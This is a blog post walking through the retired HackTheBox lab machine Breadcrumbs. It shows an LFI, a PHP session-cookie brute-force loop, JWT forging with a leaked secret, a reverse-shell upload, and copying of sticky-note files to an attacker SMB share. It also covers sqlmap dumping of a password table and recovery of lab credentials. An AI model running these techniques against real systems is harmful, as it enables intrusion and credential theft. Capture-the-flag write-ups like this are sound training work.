@@ -1,0 +1,286 @@
+<!DOCTYPE html><html lang="en"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>HackTheBox - Breadcrumbs Writeup · ElleuchX1</title><meta name="description" content="Here's my writeup for the RETIRED machine Breadcrumbs, Which is an hard Windows machine!"><link rel="icon" href="/favicon.svg" type="image/svg+xml"><link rel="alternate" type="application/rss+xml" title="ElleuchX1" href="/rss.xml"><meta property="og:title" content="HackTheBox - Breadcrumbs Writeup · ElleuchX1"><meta property="og:description" content="Here's my writeup for the RETIRED machine Breadcrumbs, Which is an hard Windows machine!"><meta property="og:type" content="article"><meta property="og:url" content="https://elleu.ch/posts/htb-breadcrumbs/"><meta property="og:image" content="https://elleu.ch/og/htb-breadcrumbs.png"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="https://elleu.ch/og/htb-breadcrumbs.png"><script>
+      (function () {
+        try {
+          var t = localStorage.getItem('theme');
+          if (!t) t = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+          document.documentElement.setAttribute('data-theme', t);
+        } catch (e) {}
+      })();
+      document.addEventListener('keydown', function (e) {
+        if (e.key !== '/' || e.metaKey || e.ctrlKey || e.altKey) return;
+        var t = e.target;
+        if (t && (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA' || t.isContentEditable)) return;
+        e.preventDefault();
+        window.location.href = '/search/';
+      });
+    </script><link rel="stylesheet" href="/_astro/_id_.mL4ELXTH.css"></head> <body> <a class="skip" href="#main">skip to content</a> <header class="site-header" data-pagefind-ignore> <div class="inner"> <a class="brand" href="/">elleuch<span class="at">:~$</span></a> <nav class="nav" aria-label="Main"> <a href="/posts/" aria-current="page">Posts</a><a href="/tags/">Tags</a><a href="/about/">About</a> <a class="search" href="/search/"><kbd>/</kbd></a> <button class="toggle" id="theme-toggle" type="button" aria-label="Toggle theme"> <svg class="i-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"> <path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"></path> </svg> <svg class="i-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"> <circle cx="12" cy="12" r="4"></circle> <path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"></path> </svg> </button> <script>
+  document.getElementById('theme-toggle')?.addEventListener('click', () => {
+    const next = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+    document.documentElement.setAttribute('data-theme', next);
+    try { localStorage.setItem('theme', next); } catch (e) {}
+  });
+</script> </nav> </div> </header> <main id="main">  <div class="progress" id="progress"></div> <div class="wrap"> <article class="article" data-pagefind-body> <a class="back" href="/posts/">← Posts</a> <header class="article-head"> <h1 data-pagefind-meta="title">HackTheBox - Breadcrumbs Writeup</h1> <div class="article-meta"> <time datetime="2021-07-17T00:00:00.000Z">2021-07-17</time> <span>5 min read</span> </div> <div class="article-tags"> <a href="/tags/hackthebox/">#HackTheBox</a><a href="/tags/hard/">#Hard</a><a href="/tags/windows/">#Windows</a> </div> </header> <details class="toc" open data-pagefind-ignore> <summary>contents</summary> <ul> <li class="d2"><a href="#nmap-scan">Nmap scan</a></li><li class="d2"><a href="#web-enumeration">Web Enumeration</a></li> </ul> </details> <div class="prose">  <h1 id="information-gathering">Information Gathering</h1>
+<hr>
+<h2 id="nmap-scan">Nmap scan</h2>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">sudo</span><span style="color:#9ECBFF"> nmap</span><span style="color:#79B8FF"> -sC</span><span style="color:#79B8FF"> -sV</span><span style="color:#79B8FF"> 10.10.10.228</span><span style="color:#79B8FF"> -v</span></span></code></pre>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">22/tcp</span><span style="color:#9ECBFF">   open</span><span style="color:#9ECBFF">  ssh</span><span style="color:#9ECBFF">           OpenSSH</span><span style="color:#9ECBFF"> for_Windows_7.7</span><span style="color:#E1E4E8"> (protocol </span><span style="color:#79B8FF">2.0</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0"> ssh-hostkey:</span><span style="color:#E1E4E8"> </span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">   2048</span><span style="color:#9ECBFF"> 9d:d0:b8:81:55:54:ea:0f:89:b1:10:32:33:6a:a7:8f</span><span style="color:#E1E4E8"> (RSA)</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">   256</span><span style="color:#9ECBFF"> 1f:2e:67:37:1a:b8:91:1d:5c:31:59:c7:c6:df:14:1d</span><span style="color:#E1E4E8"> (ECDSA)</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">_</span><span style="color:#79B8FF">  256</span><span style="color:#9ECBFF"> 30:9e:5d:12:e3:c6:b7:c6:3b:7e:1e:e7:89:7e:83:e4</span><span style="color:#E1E4E8"> (ED25519)</span></span>
+<span class="line"><span style="color:#B392F0">80/tcp</span><span style="color:#9ECBFF">   open</span><span style="color:#9ECBFF">  http</span><span style="color:#9ECBFF">          Apache</span><span style="color:#9ECBFF"> httpd</span><span style="color:#79B8FF"> 2.4.46</span><span style="color:#E1E4E8"> ((Win64) OpenSSL/1.1.1h PHP/8.0.1)</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0"> http-cookie-flags:</span><span style="color:#E1E4E8"> </span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">   /:</span><span style="color:#E1E4E8"> </span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">     PHPSESSID:</span><span style="color:#E1E4E8"> </span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">_</span><span style="color:#9ECBFF">      httponly</span><span style="color:#9ECBFF"> flag</span><span style="color:#9ECBFF"> not</span><span style="color:#9ECBFF"> set</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0"> http-methods:</span><span style="color:#E1E4E8"> </span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">_</span><span style="color:#9ECBFF">  Supported</span><span style="color:#9ECBFF"> Methods:</span><span style="color:#9ECBFF"> GET</span><span style="color:#9ECBFF"> HEAD</span><span style="color:#9ECBFF"> POST</span><span style="color:#9ECBFF"> OPTIONS</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">_http-server-header:</span><span style="color:#9ECBFF"> Apache/2.4.46</span><span style="color:#E1E4E8"> (Win64) OpenSSL/1.1.1h PHP/8.0.1</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">_http-title:</span><span style="color:#9ECBFF"> Library</span></span>
+<span class="line"><span style="color:#B392F0">135/tcp</span><span style="color:#9ECBFF">  open</span><span style="color:#9ECBFF">  msrpc</span><span style="color:#9ECBFF">         Microsoft</span><span style="color:#9ECBFF"> Windows</span><span style="color:#9ECBFF"> RPC</span></span>
+<span class="line"><span style="color:#B392F0">139/tcp</span><span style="color:#9ECBFF">  open</span><span style="color:#9ECBFF">  netbios-ssn</span><span style="color:#9ECBFF">   Microsoft</span><span style="color:#9ECBFF"> Windows</span><span style="color:#9ECBFF"> netbios-ssn</span></span>
+<span class="line"><span style="color:#B392F0">443/tcp</span><span style="color:#9ECBFF">  open</span><span style="color:#9ECBFF">  ssl/http</span><span style="color:#9ECBFF">      Apache</span><span style="color:#9ECBFF"> httpd</span><span style="color:#79B8FF"> 2.4.46</span><span style="color:#E1E4E8"> ((Win64) OpenSSL/1.1.1h PHP/8.0.1)</span></span></code></pre>
+<p>We have 6 ports open:</p>
+<ul>
+<li>SSH</li>
+<li>Webserver 80/443</li>
+<li>SMB</li>
+</ul>
+<hr>
+<h2 id="web-enumeration">Web Enumeration</h2>
+<p>Let’s take a loot at both ports 80/443, but seems they both give us the same pages! We can work one of these</p>
+<p><img src="/assets/img/htb-breadcrumbs/e-book.webp" alt="ebook"></p>
+<p>Seems like it’s an e-book library</p>
+<p><img src="/assets/img/htb-breadcrumbs/eth.webp" alt="eth"></p>
+<p>We have a search page for books, let’s try to play with it a bit</p>
+<p><img src="/assets/img/htb-breadcrumbs/ethtest.webp" alt="ethtest"></p>
+<p>I tried few manual enumeration but nothing seem to give me an interesting output!</p>
+<p>Let’s capture the request with burpsuite to see what’s actually going on</p>
+<p><img src="/assets/img/htb-breadcrumbs/LFI1.webp" alt="lfi1"></p>
+<p>Aside from the title and author parameters we have “method=0” which seems odd</p>
+<p>Let’s first send the request to repeater and change “method=1”</p>
+<p><img src="/assets/img/htb-breadcrumbs/LFI21.webp" alt="lfi21"></p>
+<p><img src="/assets/img/htb-breadcrumbs/LFI22.webp" alt="lfi22"></p>
+<p>We get a different and an interesting response which screams “local file inclusion” that also leaks the parameter “book”, let’s check if that works</p>
+<p><img src="/assets/img/htb-breadcrumbs/LFI3.webp" alt="lfi3"></p>
+<p>And yes! We have an LFI, let’s keep enumerating we don’t really have anything interesting to read yet</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">gobuster</span><span style="color:#9ECBFF"> dir</span><span style="color:#79B8FF"> -u</span><span style="color:#9ECBFF"> http://10.10.10.228/</span><span style="color:#79B8FF"> -w</span><span style="color:#9ECBFF"> /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt</span><span style="color:#79B8FF"> -x</span><span style="color:#9ECBFF"> asp,aspx,php</span></span>
+<span class="line"></span></code></pre>
+<blockquote>
+<p>-x prefix for adding extensions when fuzzing , since we’re working on windows box we may find asp/x files
+Also chose the lowercase version of raft-directories because windows is key sensitive,</p>
+</blockquote>
+<p><img src="/assets/img/htb-breadcrumbs/gob.webp" alt="gob"></p>
+<p>Seems like we have a login panel</p>
+<p><img src="/assets/img/htb-breadcrumbs/login.webp" alt="login"></p>
+<p>Since we’re looking for files to read we’re not gonna try to do stuff with the login panel! Let’s run gobuster again</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">gobuster</span><span style="color:#9ECBFF"> dir</span><span style="color:#79B8FF"> -u</span><span style="color:#9ECBFF"> http://10.10.10.228/portal</span><span style="color:#79B8FF"> -w</span><span style="color:#9ECBFF"> /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt</span><span style="color:#79B8FF"> -x</span><span style="color:#9ECBFF"> asp,aspx,php</span></span></code></pre>
+<p><img src="/assets/img/htb-breadcrumbs/gob1.webp" alt="gob"></p>
+<p>Let’s check all of these</p>
+<p><code>/includes/</code>
+<img src="/assets/img/htb-breadcrumbs/include.webp" alt="gob2"></p>
+<p><code>/php/</code>
+<img src="/assets/img/htb-breadcrumbs/files.webp" alt="files"></p>
+<p><img src="/assets/img/htb-breadcrumbs/users.webp" alt="users">
+Here we have a list of users, Let’s take note of them first and save them somewhere in case we needed users later</p>
+<hr>
+<h1 id="foothold">Foothold</h1>
+<hr>
+<p>Let’s not waste more time and check the files under /includes/ and also the cookie.php under /portal/ with our LFI</p>
+<p><code>include/fileController.php</code></p>
+<p><img src="/assets/img/htb-breadcrumbs/filecont.webp" alt="filecont"></p>
+<p>We get the JWT secret</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>$secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e'</span></span></code></pre>
+<p>Another interesting thing in the response</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>if(in_array($user, $admins) &#x26;&#x26; $_SESSION['username'] == \"paul\")</span></span></code></pre>
+<p>Seems like we need to login as the user paul</p>
+<p>Let’s check <code>Cookie.php</code></p>
+<p><img src="/assets/img/htb-breadcrumbs/cookie.webp" alt="cookie"></p>
+<p>If we clean the response, a quick sed to remove the “\r \n and ”</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>&#x3C;?php</span></span>
+<span class="line"><span>/** * @param string $username  Username requesting session cookie * </span></span>
+<span class="line"><span>* @return string $session_cookie Returns the generated cookie *</span></span>
+<span class="line"><span>* @devteam * Please DO NOT use default PHPSESSID; our security team says they are predictable. </span></span>
+<span class="line"><span>*CHANGE SECOND PART OF MD5 KEY EVERY WEEK **/</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>  function makesession($username){    </span></span>
+<span class="line"><span>  	$max = ;    </span></span>
+<span class="line"><span>  	$seed = rand(0, $max);    </span></span>
+<span class="line"><span>  	$key = "s4lTy_stR1nG_".$username[$seed]."(!528./9890";    </span></span>
+<span class="line"><span>  	$session_cookie = $username.md5($key);    </span></span>
+<span class="line"><span>  	return $session_cookie;}</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>?></span></span></code></pre>
+<p>We know that the user is “paul” which is a short username, we can generate all the possible cookies and try them until one works</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>&#x3C;?php</span></span>
+<span class="line"><span>$user="paul";</span></span>
+<span class="line"><span>for ($seed = 0; $seed &#x3C;= strlen($user) - 1; $seed++) {</span></span>
+<span class="line"><span>	$key = "s4lTy_stR1nG_".$user[$seed]."(!528./9890";  </span></span>
+<span class="line"><span>	$session_cookie = $user.md5($key);</span></span>
+<span class="line"><span>	echo "[+] Cookie : ".$session_cookie."\n";</span></span>
+<span class="line"><span>  </span></span>
+<span class="line"><span>};</span></span>
+<span class="line"><span>?></span></span></code></pre>
+<p><img src="/assets/img/htb-breadcrumbs/cok.webp" alt="cok"></p>
+<p>Let’s try them one by one and check if we can get in</p>
+<p><img src="/assets/img/htb-breadcrumbs/adm1.webp" alt="adm1"></p>
+<p><img src="/assets/img/htb-breadcrumbs/adm.webp" alt="adm.png"></p>
+<p>And we’re in!</p>
+<p>Nothing interesting in the Issues page</p>
+<p><img src="/assets/img/htb-breadcrumbs/Issues.webp" alt="issues"></p>
+<p>Let’s check the File management page</p>
+<p><img src="/assets/img/htb-breadcrumbs/file.webp" alt="file"></p>
+<p>Let’s try to upload anything to see if it works</p>
+<p><img src="/assets/img/htb-breadcrumbs/token.webp" alt="token"></p>
+<p>Seems like we need a token! We have the secret, but we forgot to check what data we should provide!
+Let’s check the response back</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>$ret = JWT::decode($jwt, $secret_key, array('HS256')); </span></span>
+<span class="line"><span>return $ret;</span></span>
+<span class="line"><span>if($_SERVER['REQUEST_METHOD'] === \"POST\"){</span></span>
+<span class="line"><span>  $admins = array(\"paul\");</span></span>
+<span class="line"><span>  $user = validate()->data->username;</span></span></code></pre>
+<p>According to this response the content of JWT token should be</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>{"data":{"username":"paul"}}</span></span></code></pre>
+<p>Now we have everything we need let’s forge our token, we can either use python or jwt.io</p>
+<p><img src="/assets/img/htb-breadcrumbs/jwt.webp" alt="jwt"></p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.4mJguG8tRd2z_feWJpmr_J3AdMeDPvW7GCK7cW7o0AI</span></span></code></pre>
+<p>Let’s add the cookie to our browser</p>
+<p><img src="/assets/img/htb-breadcrumbs/newjwt.webp" alt="newjwt"></p>
+<p>Let’s to import anything</p>
+<p><img src="/assets/img/htb-breadcrumbs/succ.webp" alt="succ"></p>
+<p>It worked!</p>
+<p>Let’s upload the reverse shell!</p>
+<p><img src="/assets/img/htb-breadcrumbs/foothold.webp" alt="foothold"></p>
+<p>And we’re in</p>
+<hr>
+<h1 id="juliette-user-privesc">Juliette User PrivESC</h1>
+<hr>
+<p>As usual, before running any enumeration tool we can check the webpage source to see if something is hidden there!</p>
+<p>We can see an interesting folder under the /portal/</p>
+<p><img src="/assets/img/htb-breadcrumbs/data.webp" alt="data"></p>
+<p><img src="/assets/img/htb-breadcrumbs/userdata.webp" alt="userdata"></p>
+<p>We have few files for users,
+Let’s check if they contains any password</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Get-ChildItem | Select-String 'password'</span></span></code></pre>
+<p><img src="/assets/img/htb-breadcrumbs/userflag.webp" alt="userflag"></p>
+<p>And we get creds for user juliette</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>juliette:jUli901./())!</span></span></code></pre>
+<p>Let’s try to ssh into the box with these creds</p>
+<p><img src="/assets/img/htb-breadcrumbs/userf.webp" alt="userf"></p>
+<hr>
+<h1 id="development-user-privesc">Development User PrivESC</h1>
+<hr>
+<p>In juliette’s Desktop we can find an interesting file <code>todo.html</code></p>
+<p><img src="/assets/img/htb-breadcrumbs/todo1.webp" alt="todo1">
+<img src="/assets/img/htb-breadcrumbs/todo2.webp" alt="todo2"></p>
+<p>Seems like we need to get the passwords that are stored in the stickynotes! According to google they should located under the %appdata% folder</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Get-ChildItem *Sticky* -Recurse</span></span></code></pre>
+<p><img src="/assets/img/htb-breadcrumbs/sticky.webp" alt="sticky"></p>
+<p>We found a directory!</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>C:\users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\</span></span></code></pre>
+<p>It contains more folders, the \LocalState\ seems interesting!</p>
+<p><img src="/assets/img/htb-breadcrumbs/state.webp" alt="state"></p>
+<p>Let’s copy these files to our machine!
+Fist we start our smbserver</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>python3 /usr/share/doc/python3-impacket/examples/smbserver.py -ip 10.10.14.6 -smb2support euch .</span></span></code></pre>
+<p>and copy these files!</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>copy * \\10.10.14.6\euch</span></span></code></pre>
+<p><img src="/assets/img/htb-breadcrumbs/smb.webp" alt="smb"></p>
+<p>Let’s check the files! the only interesting file we need is <code>plum.sqlite-wal</code></p>
+<p>It contains  the creds for the development user</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g</span></span>
+<span class="line"><span></span></span></code></pre>
+<p>Let’s try to ssh with these creds</p>
+<p><img src="/assets/img/htb-breadcrumbs/sshdev.webp" alt="sshdev"></p>
+<hr>
+<h1 id="root-user-privesc">Root User PrivESC</h1>
+<hr>
+<p>Now we’re logged in as development, we can check what’s inside <code>C:\Development\</code></p>
+<p><img src="/assets/img/htb-breadcrumbs/ff.webp" alt="ff"></p>
+<p>Let’s copy it to our machine</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>copy Krypter_Linux \\10.10.14.6\euch</span></span>
+<span class="line"><span></span></span></code></pre>
+<p><img src="/assets/img/htb-breadcrumbs/kryp.webp" alt="kryp"></p>
+<p>It’s a Linux executable, before going deeper in the binary it’s better to run strings or rabin2 -z to extract the printable strings in the binary!</p>
+<p><img src="/assets/img/htb-breadcrumbs/rabin.webp" alt="rabin"></p>
+<p>What seems odd when you see the output is the port 1234!</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>http://passmanager.htb:1234/index.php</span></span></code></pre>
+<p>Also we have the GET parameters</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>method=select&#x26;username=administrator&#x26;table=passwords</span></span></code></pre>
+<p>Seems like it’s running locally!</p>
+<p><img src="/assets/img/htb-breadcrumbs/local.webp" alt="local"></p>
+<p>Let’s forward it to our machine with ssh</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>ssh -L 1234:127.0.0.1:1234 development@10.10.10.228</span></span></code></pre>
+<p><img src="/assets/img/htb-breadcrumbs/for.webp" alt="for"></p>
+<p>The parameters names gives us a hint that it’s SQL injection
+let’s use sqlmap</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>sqlmap -u "http://127.0.0.1:1234/?method=select&#x26;username=administrator&#x26;table=passwords" --dump</span></span></code></pre>
+<p><img src="/assets/img/htb-breadcrumbs/us.webp" alt="us"></p>
+<p><img src="/assets/img/htb-breadcrumbs/AES.webp" alt="AES"></p>
+<p>We get the administrator’s password but it’s encrypted (AES)</p>
+<p>Let’s use cyberchef to decrypt it</p>
+<p><img src="/assets/img/htb-breadcrumbs/root.webp" alt="root"></p>
+<blockquote>
+<p>When i first did the machine, I overthinked this part,  I thought that i needed to to find IV somewhere in the machine <wasted a="" lot="" of="" time="" trying="" to="" find="" it=""></wasted></p>
+</blockquote>
+<p>And now let’s try to ssh into the box as the administrator and grab the flag!</p>
+<p><img src="/assets/img/htb-breadcrumbs/rooted.webp" alt="rooted"></p>  </div> <nav class="pager" aria-label="Post navigation"> <a href="/posts/htb-atom/"><span class="lbl">← prev</span>HackTheBox - Atom Writeup</a> <a class="next" href="/posts/Ezchall-crewctf/"><span class="lbl">next →</span>Crew CTF 2022 – EzChall &amp; EzChall Again</a> </nav> </article> </div> <aside class="toc-rail" data-pagefind-ignore aria-label="Table of contents"> <div class="lbl">contents</div> <ul> <li class="d2"><a href="#nmap-scan">Nmap scan</a></li><li class="d2"><a href="#web-enumeration">Web Enumeration</a></li> </ul> </aside><button class="to-top" id="to-top" type="button" aria-label="Back to top">↑ top</button>  </main> <footer class="site-footer" data-pagefind-ignore> <div class="inner"> <span>© 2026 ElleuchX1</span> <span> <a href="https://github.com/ElleuchX1">github</a> ·
+<a href="https://twitter.com/ElleuchX1">x</a> ·
+<a href="/rss.xml">rss</a> ·
+<a href="mailto:contact@elleu.ch">mail</a> </span> </div> </footer> </body></html> <script>
+  (function () {
+    // reading progress + back-to-top
+    var bar = document.getElementById('progress');
+    var top = document.getElementById('to-top');
+    function update() {
+      var h = document.documentElement;
+      var max = h.scrollHeight - h.clientHeight;
+      var pct = max > 0 ? h.scrollTop / max : 0;
+      if (bar) bar.style.width = pct * 100 + '%';
+      if (top) top.classList.toggle('show', h.scrollTop > 600);
+    }
+    document.addEventListener('scroll', update, { passive: true });
+    if (top) top.addEventListener('click', function () { window.scrollTo({ top: 0, behavior: 'smooth' }); });
+    update();
+
+    // permalink anchors on headings
+    document.querySelectorAll('.prose h2[id], .prose h3[id]').forEach(function (h) {
+      var a = document.createElement('a');
+      a.className = 'anchor';
+      a.href = '#' + h.id;
+      a.setAttribute('aria-label', 'Link to this section');
+      a.textContent = '#';
+      h.appendChild(a);
+    });
+
+    // code blocks: language label + copy button
+    document.querySelectorAll('.prose pre.astro-code').forEach(function (pre) {
+      var wrap = document.createElement('div');
+      wrap.className = 'code';
+      pre.parentNode.insertBefore(wrap, pre);
+      var bar = document.createElement('div');
+      bar.className = 'code-bar';
+      var lang = pre.getAttribute('data-language') || 'text';
+      var span = document.createElement('span');
+      span.className = 'code-lang';
+      span.textContent = lang;
+      var btn = document.createElement('button');
+      btn.type = 'button';
+      btn.className = 'copy';
+      btn.textContent = 'copy';
+      btn.addEventListener('click', function () {
+        var text = pre.innerText;
+        var done = function () { btn.textContent = 'copied'; setTimeout(function () { btn.textContent = 'copy'; }, 1200); };
+        if (navigator.clipboard) { navigator.clipboard.writeText(text).then(done, done); }
+        else {
+          var ta = document.createElement('textarea'); ta.value = text; document.body.appendChild(ta); ta.select();
+          try { document.execCommand('copy'); } catch (e) {} ta.remove(); done();
+        }
+      });
+      bar.appendChild(span);
+      bar.appendChild(btn);
+      wrap.appendChild(bar);
+      wrap.appendChild(pre);
+    });
+  })();
+</script>
